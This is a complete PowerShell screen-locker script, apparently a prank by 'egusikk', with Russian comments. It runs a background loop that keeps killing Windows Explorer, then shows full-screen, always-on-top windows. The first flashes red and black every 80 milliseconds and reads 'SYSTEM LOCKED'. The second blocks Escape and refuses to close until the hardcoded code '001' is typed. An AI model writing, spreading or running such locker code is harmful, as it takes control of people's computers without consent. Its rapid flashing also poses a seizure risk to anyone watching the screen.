Add-Type -AssemblyName PresentationFramework
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

$global:Unlocked = $false

# Фоновый блокировщик Explorer
$BlockExplorerJob = {
    while ($true) {
        $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if ($explorer) {
            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 300
    }
}
$job = Start-Job -ScriptBlock $BlockExplorerJob

function Show-RedFlashingScreen {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk :)"
    $form.WindowState = "Maximized"
    $form.FormBorderStyle = "None"
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::Red
    $form.KeyPreview = $true

    # Большой текст в центре
    $mainLabel = New-Object System.Windows.Forms.Label
    $mainLabel.Text = "SYSTEM LOCKED"
    $mainLabel.ForeColor = [System.Drawing.Color]::White
    $mainLabel.Font = New-Object System.Drawing.Font("Consolas", 48, [System.Drawing.FontStyle]::Bold)
    $mainLabel.AutoSize = $true
    $form.Controls.Add($mainLabel)

    # Инструкция снизу
    $spaceLabel = New-Object System.Windows.Forms.Label
    $spaceLabel.Text = "[ PRESS SPACE TO ENTER CODE ]"
    $spaceLabel.ForeColor = [System.Drawing.Color]::Yellow
    $spaceLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
    $spaceLabel.AutoSize = $true
    $form.Controls.Add($spaceLabel)

    # Центрирование элементов
    $form.Add_Resize({
        $mainLabel.Left = ($form.ClientSize.Width - $mainLabel.Width) / 2
        $mainLabel.Top = ($form.ClientSize.Height - $mainLabel.Height) / 2 - 50
        $spaceLabel.Left = ($form.ClientSize.Width - $spaceLabel.Width) / 2
        $spaceLabel.Top = $form.ClientSize.Height - 80
    })

    # Быстрое мигание красный <-> чёрный
    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 80  # Очень быстрое мигание
    $isRed = $true
    $timer.Add_Tick({
        if ($isRed) {
            $form.BackColor = [System.Drawing.Color]::Black
            $mainLabel.ForeColor = [System.Drawing.Color]::Red
        } else {
            $form.BackColor = [System.Drawing.Color]::Red
            $mainLabel.ForeColor = [System.Drawing.Color]::White
        }
        $isRed = !$isRed
    })
    $timer.Start()

    # Обработка нажатия Space
    $form.Add_KeyDown({
        param($_, $e)
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Space) {
            $timer.Stop()
            $form.Close()
        }
        # Блокировка Escape и других
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $e.Handled = $true
        }
    })

    $form.Add_Shown({ 
        $form.Activate()
        $mainLabel.Left = ($form.ClientSize.Width - $mainLabel.Width) / 2
        $mainLabel.Top = ($form.ClientSize.Height - $mainLabel.Height) / 2 - 50
        $spaceLabel.Left = ($form.ClientSize.Width - $spaceLabel.Width) / 2
        $spaceLabel.Top = $form.ClientSize.Height - 80
    })

    $form.ShowDialog() | Out-Null
}

function Show-PasswordWindow {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk :)"
    $form.WindowState = "Maximized"
    $form.FormBorderStyle = "None"
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 40)  # Тёмно-синий
    $form.KeyPreview = $true

    $panel = New-Object System.Windows.Forms.Panel
    $panel.Size = New-Object System.Drawing.Size(420, 260)
    $panel.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 60)
    $panel.BorderStyle = "FixedSingle"
    $form.Controls.Add($panel)

    $form.Add_Resize({
        $panel.Left = ($form.ClientSize.Width - $panel.Width) / 2
        $panel.Top = ($form.ClientSize.Height - $panel.Height) / 2
    })

    # Заголовок
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "ENTER UNLOCK CODE"
    $titleLabel.ForeColor = [System.Drawing.Color]::Cyan
    $titleLabel.Font = New-Object System.Drawing.Font("Consolas", 22, [System.Drawing.FontStyle]::Bold)
    $titleLabel.Location = New-Object System.Drawing.Point(50, 30)
    $titleLabel.Size = New-Object System.Drawing.Size(320, 40)
    $titleLabel.TextAlign = "MiddleCenter"
    $panel.Controls.Add($titleLabel)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(60, 100)
    $textBox.Size = New-Object System.Drawing.Size(300, 35)
    $textBox.Font = New-Object System.Drawing.Font("Consolas", 18)
    $textBox.PasswordChar = "*"
    $textBox.BackColor = [System.Drawing.Color]::Black
    $textBox.ForeColor = [System.Drawing.Color]::Lime
    $panel.Controls.Add($textBox)

    $button = New-Object System.Windows.Forms.Button
    $button.Location = New-Object System.Drawing.Point(150, 160)
    $button.Size = New-Object System.Drawing.Size(120, 40)
    $button.Text = "UNLOCK"
    $button.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    $button.ForeColor = [System.Drawing.Color]::White
    $button.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
    $panel.Controls.Add($button)

    $UnlockAction = {
        if ($textBox.Text -eq "001") {
            $global:Unlocked = $true
            $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("НЕВЕРНЫЙ КОД!", "ERROR", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Error)
            $textBox.Clear()
            $textBox.Focus()
        }
    }

    $button.Add_Click($UnlockAction)

    # Обработка клавиш
    $textBox.Add_KeyDown({
        param($_, $e)
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
            & $UnlockAction
        }
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $e.Handled = $true
        }
    })

    $form.Add_KeyDown({
        if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $_.Handled = $true
        }
    })

    $form.Add_FormClosing({
        param($_, $e)
        if (-not $global:Unlocked) {
            $e.Cancel = $true
        }
    })

    $form.Add_Shown({ $textBox.Focus() })
    $form.ShowDialog() | Out-Null
}

# Запуск
Show-RedFlashingScreen
Show-PasswordWindow

if ($global:Unlocked -eq $true) {
    Stop-Job $job
    Remove-Job $job
    Start-Process "explorer.exe"
    [System.Windows.Forms.MessageBox]::Show("System unlocked successfully!", "Success", 
        [System.Windows.Forms.MessageBoxButtons]::OK, 
        [System.Windows.Forms.MessageBoxIcon]::Information)
}
